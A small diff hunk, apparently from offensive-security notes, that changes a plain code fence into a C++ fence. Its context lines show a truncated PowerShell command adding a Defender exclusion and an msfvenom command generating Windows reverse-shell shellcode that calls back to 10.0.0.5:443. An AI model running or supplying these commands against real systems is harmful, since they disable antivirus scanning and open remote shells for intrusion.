@@ -268,7 +268,7 @@ powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpP
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f c -b \x00\x0a\x0d
 ```
 
-```
+```c++
 #include "stdafx.h"
 #include "Windows.h"
 
